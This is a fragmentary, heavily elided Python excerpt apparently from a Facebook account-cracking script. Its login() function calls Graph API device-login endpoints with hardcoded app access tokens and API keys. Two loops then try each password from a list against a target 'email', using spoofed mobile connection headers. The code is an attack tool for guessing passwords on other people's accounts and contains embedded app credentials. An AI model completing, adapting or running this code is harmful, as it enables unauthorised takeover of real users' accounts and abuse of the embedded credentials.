...
def login():
    ...
    try:
        ...
        data = {'access_token': '6840756239273008|a6e6e6799919a42513aaf39c1b4bab90', 'scope': ''}
        req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()
        cd   = req['code']
        ucd  = req['user_code']
        url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=6840756239273008|a6e6e6799919a42513aaf39c1b4bab90'%(cd)
        ...
        for pw in __juts__:
            try:
                ...
                data = {
                    ...
                    'adid':adid,
                    'api_key':'a6e6e6799919a42513aaf39c1b4bab90',
                    'email':user,
                    'password':pw,
                    'community_id':'',
                ...
                head={
                    ...
                    'authorization':'OAuth 6840756239273008|a6e6e6799919a42513aaf39c1b4bab90',
                    'content-type':'application/x-www-form-urlencoded',
        ...
        for pw in __juts__:
            try:
                ...
                data = {
                    ...
                    'api_key':'ee7c26e3cf9aca409b247c25b7aa43b7a314ab66',
                    'access_token':'6840756239273008|a6e6e6799919a42513aaf39c1b4bab90'
                }
                head={
                    'x-fb-connection-quality':'EXCELLENT',
                    'x-fb-connection-type':'MOBILE.LTE',
